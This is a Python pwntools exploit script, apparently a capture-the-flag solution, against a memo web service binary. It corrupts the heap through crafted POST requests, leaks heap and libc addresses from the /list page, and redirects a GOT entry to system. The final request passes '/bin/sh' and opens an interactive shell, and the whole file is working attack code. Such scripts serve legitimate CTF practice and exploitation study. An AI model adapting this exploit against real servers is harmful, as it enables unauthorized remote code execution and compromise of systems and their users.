#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./pwn"
elf=ELF(pwn_file)
libc=elf.libc
heap_add=0
stack_add=0
cookie=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("stack add:0x%x"%stack_add)
    log.debug("cookie:0x%x"%cookie)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def http(type,router,):
    s="%s %s %s\n"%(type,router,"what")
    s+="Connection: keep-alive\n\n"
    return s

def add(name,value,length=len(name)):
    name=name.replace('\x00',"%00")
    name=name.ljust(length,'a')
    s=http("POST","/add")
    s+="&memo=%s&count=%d"%(name,value)
    r.send(s)
    r.recvuntil("json\n\n")

def show():
    s=http("GET","/list")
    r.send(s)
    r.recvuntil("<html><body><table border=1><tr><th>name</th><th>count</th></tr>")
    ret=[]
    while True:
        data=r.recv(4)
        if "<tr>" == data:
            r.recvuntil("<td>")
            name=r.recvuntil("</td>")[:-5]
            r.recvuntil("<td>")
            value=int(r.recvuntil("</td>")[:-5])
            ret.append((name,value))
            r.recvuntil("</tr>")
        else:
            break
    return ret

def count():
    s=http("POST","/count")
    r.send(s)
def echo(cont):
    s=http("POST","/echo")
    s+="content=%s"%cont
    r.send(s)
    r.recvuntil("\"echo\":\"")
    return r.recvuntil("\"")[:-1]

add("a",1)

add("a"*0x28+"\x31",1)
add("b"*0x30,1)
add("c"*0x30,1)
count()
count()
ret=show()
heap_add=u64(ret[2][0].ljust(8,'\x00'))-0x60
add(p64(heap_add+0x60)[:3],1)
count()
count()
sleep(4)

add("x"*0x20,1)
add("a"*0x20,1)
add("b"*0x20,1)
add("c"*0x20,1)
count()
count()
add(p64(heap_add+0x610)[:3],1)
count()
count()
sleep(4)



add(p64(heap_add+0x90)+"a"*0x10,1)
add("1"*0x40,1)
add("2"*0x40,1)
add("3"*0x40,1)
add("0"*0x20,1)
add("1"*0x20,1)
add("2"*0x10+p64(0x603038),1)

libc.address=u64(show()[2][0].ljust(8,"\x00"))-libc.sym["strlen"]
add(p64(0x60308a)+"a"*0x20,1)
add("a"*0x30,1)
add("b"*0x30,1)

name="a"*6+p64(libc.sym["system"])+"a"*0x18
name=name.replace('\x00',"%00")
s=http("POST","/add")
s+="&memo=%s&count=%s"%(name,"/bin/sh")
r.send(s)

r.interactive()


